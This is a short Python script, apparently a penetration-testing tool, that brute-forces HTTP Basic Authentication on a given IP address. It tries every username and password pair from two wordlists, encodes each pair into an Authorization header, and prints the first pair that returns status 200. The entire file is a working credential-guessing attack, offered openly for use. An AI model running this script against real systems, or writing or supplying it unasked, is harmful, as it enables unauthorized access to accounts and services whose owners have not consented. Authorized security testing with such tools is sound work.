#!/usr/bin/env python3

import requests
import base64
import sys
usage="""
Brute Force Basic Authentication
python3 basic-auth-bf.py -i [IP_ADDRESS] -U [username_list] -P [password_list]
"""
if  len(sys.argv) != 7 or sys.argv[0] == "--help" or sys.argv[0] == "-h":
    print(usage)
else:
    username_list=sys.argv[4]
    password_list=sys.argv[6]
    ip_addess=sys.argv[2]

    with open(username_list) as fp:
        user_lines = fp.readlines()
        for user_line in user_lines:
            with open(password_list) as fp1:
                pass_lines = fp1.readlines()
                for pass_line in pass_lines:
                    uss_pass=user_line.strip() + ":" + pass_line.strip()
                    message_bytes = uss_pass.encode('ascii')
                    base64_bytes = base64.b64encode(message_bytes)
                    base64_message = base64_bytes.decode('ascii')
                    r = requests.get("http://" + ip_addess, headers={"Authorization": "Basic {0}".format(base64_message)})
                    print(f"Checking... {uss_pass}")
                    if r.status_code == 200:
                        print(f"\n\nFOUND: {uss_pass}")
                        break
                else:
                    continue
                break
                            